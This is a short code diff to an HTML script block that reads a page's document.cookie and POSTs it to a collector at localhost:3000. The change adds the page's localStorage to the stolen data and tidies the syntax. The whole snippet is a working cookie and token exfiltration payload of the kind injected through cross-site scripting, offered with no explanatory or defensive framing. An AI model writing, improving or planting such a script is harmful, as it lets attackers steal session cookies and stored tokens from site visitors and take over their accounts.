@@ -1,13 +1,13 @@
 <script>
-    var cookies = document.cookie;
+    const cookies = document.cookie;
     fetch('http://localhost:3000/', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify({ cookies: cookies })
+        body: JSON.stringify({ cookies, localStorage })
     })
         .then(response => response.json())
-        .then(data => console.log('Cookies :', data))
+        .then(data => console.log('Cookies:', data))
         .catch(error => console.error('Erro:', error));
 </script>
